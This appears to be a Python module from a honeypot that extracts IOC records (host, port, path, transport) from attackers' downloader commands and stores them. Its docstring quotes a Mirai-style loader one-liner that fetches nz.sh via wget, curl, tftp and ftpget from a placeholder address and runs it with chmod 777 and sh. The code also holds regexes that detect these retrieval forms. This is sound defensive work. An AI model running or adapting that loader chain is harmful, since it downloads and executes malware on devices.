"""Loader IOCs pulled out of attacker commands.

A honeypot with no egress sees far more *downloaders* than dropped files. The
Mirai-family loader that lands here fifty times a day looks like this:

    cd /tmp || cd /var/run; wget http://198.51.100.9/nz.sh;
    curl -O http://198.51.100.9/nz.sh; chmod 777 nz.sh; sh nz.sh;
    tftp 198.51.100.9 -c get nz.sh; ftpget -v -u anonymous -p anonymous
    -P 21 198.51.100.9 2.sh 2.sh

Nothing is ever transferred -- the fetch fails, because the box cannot reach
out. So there is no file, no hash, and nothing for VirusTotal. What there *is*
is the retrieval chain: an address, a port, a path, and four different transports
tried in order. That is the most valuable artefact this deployment collects, and
until now it existed only as a string inside a log line.

This module turns those command lines into records. It does not fetch anything;
see intel/fetcher.py, which runs in the one container that has egress and is
off by default.
"""

import hashlib
import ipaddress
import json
import os
import re
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

STORAGE_DIR = Path(os.getenv("STORAGE_DIR", "/var/honeypot/storage"))
IOC_DIR = Path(os.getenv("IOC_DIR", str(STORAGE_DIR / "ioc")))

# Bounded like everything else here: one command line can name a dozen hosts,
# and a flood of them must not be able to fill the disk through this path.
MAX_PER_COMMAND = 12
MAX_IOC_FILES = int(os.getenv("IOC_MAX_FILES", "20000"))
MAX_SIGHTINGS = 50

# http(s) URLs, wherever they appear in a pipeline.
URL_RE = re.compile(r"\b(https?|ftp)://[^\s'\"|;&<>()]+", re.IGNORECASE)

# `tftp <host> -c get <file>` and `tftp -r <file> -g <host>`. Both forms are in
# active use by the same loader, often on the same line.
TFTP_C_RE = re.compile(
    r"\btftp\s+(?:-[a-z]\s+\S+\s+)*?([\w.:\-\[\]]+)\s+-c\s+get\s+(\S+)", re.IGNORECASE)
TFTP_R_RE = re.compile(
    r"\btftp\s+-r\s+(\S+)\s+-g\s+([\w.:\-\[\]]+)", re.IGNORECASE)
# And busybox's own documented order, `tftp -g -r <file> <host>`, where the
# host is the trailing argument rather than the operand of -g. The two -g forms
# cannot both match one invocation, so nothing is recorded twice.
TFTP_G_RE = re.compile(
    r"\btftp\s+-g\s+(?:-l\s+\S+\s+)?-r\s+(\S+)\s+([\w.:\-\[\]]+)", re.IGNORECASE)

# busybox ftpget: `ftpget [-cv] [-u user] [-p pass] [-P port] <host> [local] <remote>`
#
# The options are consumed explicitly rather than skipped with a lazy run.
# `[^\n;|&]*?\s(\S+)\s+(\S+)` reaches its first match immediately after the
# command name, so the documented invocation above recorded a host of `-v` and
# a path of `/anonymous`: a well-formed, confident, entirely fictional IOC that
# nothing flagged, because there is no error state for parsing the wrong thing
# successfully.
FTPGET_RE = re.compile(
    r"\bftpget\b((?:\s+(?:-[cv]|-[upP]\s+\S+))*)"
    r"\s+([\w.:\-\[\]]+)(?:\s+(\S+))?(?:\s+(\S+))?", re.IGNORECASE)


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _default_port(scheme: str) -> int:
    return {"https": 443, "ftp": 21, "tftp": 69}.get(scheme, 80)


def _split_authority(authority: str):
    """(host, port or None) from an authority, tolerating creds and IPv6."""
    authority = authority.rsplit("@", 1)[-1]
    match = re.match(r"^(\[[^\]]+\]|[^:]+)(?::(\d+))?$", authority)
    if not match:
        return authority, None
    port = match.group(2)
    return match.group(1), int(port) if port else None


def is_public(host: str) -> bool:
    """False for anything that is not a routable public address.

    A hostname we cannot resolve here counts as public: this runs inside a
    container with no DNS and no egress, so refusing to record a name would
    discard the interesting case. The fetcher resolves and re-checks before it
    connects -- that is where the decision actually has consequences.
    """
    try:
        address = ipaddress.ip_address(host.strip("[]"))
    except ValueError:
        return True
    return not (address.is_private or address.is_loopback or address.is_reserved
                or address.is_link_local or address.is_multicast
                or address.is_unspecified)


def _record(found: List[Dict[str, Any]], *, scheme: str, host: str,
            port: Optional[int], path: str, method: str, raw: str) -> None:
    if not host or len(found) >= MAX_PER_COMMAND:
        return
    host = host.strip().strip("[]")
    if not host or host.lower() in ("localhost",):
        return
    found.append({
        "scheme": scheme.lower(),
        "host": host,
        "port": port or _default_port(scheme.lower()),
        "path": path or "/",
        "method": method,
        "raw": raw[:300],
        "public": is_public(host),
    })


def extract(command: str) -> List[Dict[str, Any]]:
    """Every retrieval target named in one command line, de-duplicated."""
    if not command:
        return []
    found: List[Dict[str, Any]] = []

    for match in URL_RE.finditer(command):
        url = match.group(0).rstrip(".,;")
        scheme = match.group(1).lower()
        rest = url.split("://", 1)[1]
        authority, _, path = rest.partition("/")
        host, port = _split_authority(authority)
        method = "curl" if re.search(r"\bcurl\b", command, re.I) else "wget"
        if scheme == "ftp":
            method = "ftp"
        _record(found, scheme=scheme, host=host, port=port,
                path="/" + path, method=method, raw=url)

    for host, filename in TFTP_C_RE.findall(command):
        _record(found, scheme="tftp", host=host, port=None,
                path="/" + filename.lstrip("/"), method="tftp",
                raw=f"tftp {host} -c get {filename}")

    for filename, host in TFTP_R_RE.findall(command):
        _record(found, scheme="tftp", host=host, port=None,
                path="/" + filename.lstrip("/"), method="tftp",
                raw=f"tftp -r {filename} -g {host}")

    for filename, host in TFTP_G_RE.findall(command):
        _record(found, scheme="tftp", host=host, port=None,
                path="/" + filename.lstrip("/"), method="tftp",
                raw=f"tftp -g -r {filename} {host}")

    for match in FTPGET_RE.finditer(command):
        host = match.group(2)
        # ftpget takes <local> then <remote>; the remote name is what to ask
        # for, and loaders usually pass the same string twice. With only one
        # filename given, busybox uses it for both.
        remote = match.group(4) or match.group(3)
        if not remote:
            continue
        port = None
        # Searched in the options group only, and case-sensitively: -P is the
        # port, -p is the password, and a numeric password is not a port.
        port_match = re.search(r"-P\s+(\d+)", match.group(1) or "")
        if port_match:
            port = int(port_match.group(1))
        _record(found, scheme="ftp", host=host, port=port,
                path="/" + remote.lstrip("/"), method="ftpget",
                raw=match.group(0).strip()[:300])

    unique = {}
    for entry in found:
        key = (entry["scheme"], entry["host"], entry["port"], entry["path"])
        unique.setdefault(key, entry)
    return list(unique.values())


def _key(entry: Dict[str, Any]) -> str:
    canonical = f"{entry['scheme']}://{entry['host']}:{entry['port']}{entry['path']}"
    return hashlib.sha256(canonical.encode()).hexdigest()[:32]


def key_for(entry: Dict[str, Any]) -> str:
    """The sidecar filename stem for a target, without the leading underscore.

    The fetcher needs to find the record it just wrote in order to note the
    outcome on it, and reaching into a private for that made the two modules
    look more entangled than they are.
    """
    return _key(entry)


def record(command: str, *, ip: str, service: str) -> List[Dict[str, Any]]:
    """Extract and persist. Returns what was found; never raises."""
    try:
        found = extract(command)
        if not found:
            return []
        IOC_DIR.mkdir(parents=True, exist_ok=True)
        # Cheap ceiling. Counting the directory on every command would be a
        # syscall per command, so only check once it could plausibly matter.
        if len(found) and _too_many():
            return found
        for entry in found:
            _persist(entry, ip=ip, service=service)
        return found
    except Exception:                                           # noqa: BLE001
        # Intelligence gathering must never break a session.
        return []


_count_cache = {"at": 0.0, "n": 0}


def _too_many() -> bool:
    now = time.time()
    if now - _count_cache["at"] > 60:
        try:
            _count_cache["n"] = sum(1 for _ in IOC_DIR.glob("*.json"))
        except OSError:
            _count_cache["n"] = 0
        _count_cache["at"] = now
    return _count_cache["n"] >= MAX_IOC_FILES


def record_derived(entries: List[Dict[str, Any]], *, ip: str, service: str,
                   lineage: Optional[Dict[str, Any]] = None) -> List[str]:
    """Persist targets found inside a fetched artifact. Returns their keys.

    The honeypot path (record()) turns a command line into records. This turns
    the *body of a stage-1 dropper* into the same records, so the eleven
    architecture URLs a loader names show up on the dashboard's loader list
    exactly like any other IOC, and are retryable on a later pass if the
    fetcher's chain budget ran out before reaching them.

    Called only by intel/fetcher.py. Nothing in a honeypot container fetches
    anything, so nothing in a honeypot container has a body to derive from.
    """
    keys = []
    try:
        IOC_DIR.mkdir(parents=True, exist_ok=True)
        if _too_many():
            return keys
        for entry in entries[:MAX_PER_COMMAND * 4]:
            _persist(entry, ip=ip, service=service, lineage=lineage)
            keys.append(_key(entry))
    except Exception:                                           # noqa: BLE001
        return keys
    return keys


def _persist(entry: Dict[str, Any], *, ip: str, service: str,
             lineage: Optional[Dict[str, Any]] = None) -> None:
    path = IOC_DIR / f"{_key(entry)}.json"
    sighting = {"at": _now(), "ip": ip, "service": service}

    existing: Dict[str, Any] = {}
    if path.is_file():
        try:
            existing = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            existing = {}

    if existing:
        existing["last_seen"] = sighting["at"]
        existing["times_seen"] = int(existing.get("times_seen") or 0) + 1
        existing["sightings"] = ((existing.get("sightings") or [])
                                 + [sighting])[-MAX_SIGHTINGS:]
    else:
        existing = dict(entry)
        existing.update({
            "first_seen": sighting["at"],
            "last_seen": sighting["at"],
            "times_seen": 1,
            "sightings": [sighting],
            # Set by the fetcher, when it is enabled and gets that far.
            "fetch": None,
        })

    # Additive, and only on first sight. A target named by a dropper and later
    # typed directly by an attacker keeps the provenance of how we first came
    # to know about it -- overwriting it on every re-sighting would mean the
    # field says whichever thing happened most recently, which is not lineage.
    if lineage and not existing.get("lineage"):
        existing["lineage"] = lineage

    tmp = path.with_suffix(".tmp")
    try:
        tmp.write_text(json.dumps(existing, default=str), encoding="utf-8")
        tmp.replace(path)
    except OSError:
        try:
            tmp.unlink()
        except OSError:
            pass


def load_all(limit: int = 5000) -> List[Dict[str, Any]]:
    """Every recorded IOC, newest sighting first."""
    out = []
    if not IOC_DIR.is_dir():
        return out
    for path in sorted(IOC_DIR.glob("*.json"))[:limit]:
        try:
            out.append(json.loads(path.read_text(encoding="utf-8")))
        except (OSError, json.JSONDecodeError):
            continue
    out.sort(key=lambda e: str(e.get("last_seen") or ""), reverse=True)
    return out


def for_ip(ip: str, limit: int = 200) -> List[Dict[str, Any]]:
    return [entry for entry in load_all()
            if any(s.get("ip") == ip for s in entry.get("sightings") or [])][:limit]
